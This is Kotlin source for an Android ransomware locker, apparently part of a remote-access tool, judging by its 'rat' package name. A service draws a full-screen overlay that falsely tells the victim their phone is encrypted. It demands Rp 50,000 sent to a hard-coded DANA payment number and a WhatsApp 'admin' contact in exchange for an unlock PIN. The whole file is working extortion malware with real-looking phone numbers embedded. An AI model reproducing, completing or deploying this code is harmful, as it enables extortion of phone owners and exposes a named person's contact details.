package com.kalxx.rat

import android.app.Service
import android.content.Intent
import android.net.Uri
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class LockScreenService : Service() {
    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var correctPin = "1234" 
    
    // --- UDAH GUE MASUKIN NOMOR LU ---
    private val nomorDana = "085773264815" 
    private val nomorWa = "6285773264815" 

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        correctPin = intent?.getStringExtra("PIN") ?: "1234"
        showLockScreen()
        return START_STICKY
    }

    private fun showLockScreen() {
        if (overlayView != null) return
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0F0F0F"))
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }
        root.addView(TextView(this).apply { text = "☠️"; textSize = 80f; gravity = Gravity.CENTER })
        root.addView(TextView(this).apply { text = "PERANGKAT TERKUNCI"; setTextColor(Color.parseColor("#00FF00")); textSize = 24f; typeface = Typeface.DEFAULT_BOLD; gravity = Gravity.CENTER; setPadding(0, 20, 0, 10) })
        root.addView(TextView(this).apply { text = "HP ini terenkripsi. Transfer Rp 50.000 ke DANA:\n\n$nomorDana\n\nLalu hubungi WA Admin untuk PIN."; setTextColor(Color.LTGRAY); textSize = 16f; gravity = Gravity.CENTER; setPadding(0, 0, 0, 30) })
        
        root.addView(Button(this).apply {
            text = "HUBUNGI ADMIN (WA)"
            setBackgroundColor(Color.parseColor("#25D366"))
            setTextColor(Color.WHITE)
            setOnClickListener {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/$nomorWa?text=Halo%20admin,%20saya%20sudah%20transfer.%20Ini%20PIN%20saya:")))
            }
        }, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 30 })

        val input = android.widget.EditText(this).apply { hint = "KETIK ANGKA PIN"; setTextColor(Color.WHITE); gravity = Gravity.CENTER; inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD }
        root.addView(input, LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 })

        root.addView(Button(this).apply {
            text = "BUKA KUNCI"
            setBackgroundColor(Color.parseColor("#00FF00"))
            setTextColor(Color.BLACK)
            setOnClickListener {
                if (input.text.toString() == correctPin) { windowManager?.removeView(overlayView); overlayView = null; stopSelf() } 
                else { Toast.makeText(this@LockScreenService, "PIN SALAH!", Toast.LENGTH_SHORT).show(); input.text.clear() }
            }
        })
        overlayView = root
        windowManager?.addView(overlayView, params)
    }

    override fun onDestroy() { overlayView?.let { windowManager?.removeView(it) }; super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
